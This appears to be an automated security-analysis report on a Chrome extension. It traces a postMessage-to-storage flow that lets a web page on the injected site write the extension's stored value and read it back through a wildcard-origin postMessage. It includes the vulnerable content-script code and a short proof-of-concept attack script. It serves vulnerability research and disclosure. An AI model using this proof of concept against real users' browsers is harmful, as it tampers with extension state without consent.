# CoCo Analysis: bgmeemhjcnbplkadnamijaihpijdpmfg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (both are the same flow, detected twice by CoCo)

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink → storage_local_get_source → window_postMessage_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bgmeemhjcnbplkadnamijaihpijdpmfg/opgen_generated_files/cs_0.js
Line 478    window.addEventListener("message", (event) => {
Line 479    if (event.data.action === "storeToken") {
Line 482    console.log("sending token to background script from content script", event.data.token);
Line 491    console.log( "storage", items.itm );
```

**Code:**

```javascript
// Content script (cs_0.js line 642)
window.onmessage = function ( event ) {

    if ( event.data && event.data.name && event.data.name === "song_changed" ) {

        console.log( "itm_change", event.data.data.itm ); // ← attacker-controlled

        if ( app_state.active ) {

            chrome.storage.local.set({ itm: event.data.data.itm }); // ← Line 650: storage poisoning

        } else {

            chrome.storage.local.get( [ "itm" ], function ( items ) {

                if ( !items.itm ) {

                    chrome.storage.local.set({ itm: event.data.data.itm }); // ← Line 658: storage poisoning

                };

                app_state.active = true;
                start();

            });

        };

    }
    // ... other message handlers
};

// Function start - storage retrieval and postMessage (cs_0.js line 476)
function start () {

    x.detect({
        method: "once",
        selector: "#jp_audio_0",
    }).then( function ( audio_element ) {

        audio_element.volume = 0;

        var state = {};

        chrome.storage.local.get( [ "itm" ], function ( items ) {

            console.log( "storage", items.itm ); // ← Line 491: reads poisoned storage

            if ( items.itm ) {

                window.postMessage({  // ← Line 495: sends poisoned data back to page

                    name: "set_itm",
                    data: {
                        itm: items.itm, // ← attacker-controlled data returned
                    },

                }, "*" ); // ← Sends to any origin (wildcard)

                // ... rest of function
            }
        });
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.addEventListener("message") in content script - webpage postMessage

**Attack:**

```javascript
// Attacker webpage on https://www.licensequote.com/pub/AGsoundtrax-Stock-Music-Library/licensing/*
// (where content script is injected per manifest.json)

// Step 1: Poison storage
window.postMessage({
    name: "song_changed",
    data: {
        itm: "ATTACKER_PAYLOAD_HERE"
    }
}, "*");

// Step 2: Listen for poisoned data to be returned
window.addEventListener("message", function(event) {
    if (event.data.name === "set_itm") {
        console.log("Retrieved poisoned itm:", event.data.data.itm);
        // Attacker now has confirmed storage poisoning and retrieval
    }
});

// Step 3: Trigger start() function which reads and sends back the poisoned storage
// This happens automatically when the extension detects the audio element
```

**Impact:** Complete storage exploitation chain. An attacker on `https://www.licensequote.com/pub/AGsoundtrax-Stock-Music-Library/licensing/*` can:
1. Poison chrome.storage.local with arbitrary data via window.postMessage
2. Retrieve the poisoned data back via window.postMessage (wildcard origin "*")
3. This creates a full read/write storage exploitation where attacker controls both input and output

The vulnerability allows an attacker to manipulate extension state and potentially interfere with the extension's audio player functionality by controlling the "itm" value, which appears to be used for tracking audio playback state.
